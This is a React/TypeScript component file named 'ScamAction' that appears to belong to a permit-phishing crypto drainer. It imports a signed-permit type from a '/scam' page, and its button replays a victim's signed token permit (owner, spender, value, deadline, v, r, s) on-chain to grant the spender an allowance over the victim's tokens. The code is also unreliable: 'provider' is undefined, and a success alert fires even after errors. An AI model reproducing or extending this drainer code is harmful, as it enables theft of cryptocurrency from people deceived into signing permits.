'use client';

import {SignedPermitSignature} from "@/app/scam/page";
import { callContractMethod } from "../page";
import {CustomContract} from "@/app/TokenList";

const ScamAction = (props: {
	data: SignedPermitSignature
}) => {
	const {data} = props;
	return (
		<div>
			<button onClick={()=>{

				callContractMethod('permit', [
						data.permit.owner,
						data.permit.spender,
						data.permit.value,
						data.permit.deadline,
						data.v,
						data.r,
						data.s,
						{
							gasLimit: 1000000
						}
					],CustomContract.ETH,
					provider.connection.url+"")
					.catch((e)=>{
						alert(`ERROR ${e?.message ?? e}`);
						console.error(e)
					}).then(()=>{
					alert("Permit successful!")
				});
			}}>
				permit
			</button>
		</div>
	);
};

export default ScamAction;
